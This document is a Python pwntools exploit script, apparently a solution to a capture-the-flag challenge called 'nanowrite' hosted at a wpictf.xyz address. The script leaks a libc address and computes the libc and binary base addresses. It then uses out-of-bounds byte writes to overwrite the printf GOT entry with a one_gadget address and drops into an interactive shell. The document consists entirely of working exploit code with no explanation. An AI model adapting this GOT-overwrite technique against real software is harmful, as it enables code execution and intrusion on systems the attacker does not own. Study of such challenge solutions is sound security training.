from pwn import *
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./nanowrite'],env={"LD_PRELOAD":'/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so'})
#target=remote('dorsia4.wpictf.xyz', 31337)
libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so')
context.terminal=["tmux","split","-h"]
gdb.attach(target)

leak=target.recvuntil(" ").strip(" ")

libc_system=int(leak,16)-765772
print("system="+hex(libc_system))
libc_base=libc_system-libc.symbols["system"]
print("base="+hex(libc_base))
libc_printf=libc_base+libc.symbols["printf"]
print("libc_printf="+hex(libc_printf))
libc_scanf=libc_base+libc.symbols["__isoc99_scanf"]
print("libc_scanf="+hex(libc_scanf))
gadget=0x4f322
libc_gadget=libc_base+gadget
print("gadget="+hex(libc_gadget))
pieoff=0x613000
piebase=libc_base+pieoff
print("piebase="+hex(piebase))
printfgotoff=0x4018
printf_got=piebase+printfgotoff
print("printf_got="+hex(printf_got))
aoff=0x4080

def write(addroff,value):
    index=addroff-aoff
    print(str(index))
    target.sendline(str(index)+" "+value)

#write(printfgotoff,hex(libc_gadget)[12:14])
#write(printfgotoff+1,hex(libc_gadget)[10:12])
#write(printfgotoff+2,hex(libc_gadget)[8:10])

target.sendline(str(-104)+" "+hex(libc_gadget)[12:14])
target.sendline(str(-103)+" "+hex(libc_gadget)[10:12])
target.sendline(str(-102)+" "+hex(libc_gadget)[8:10])

target.interactive()



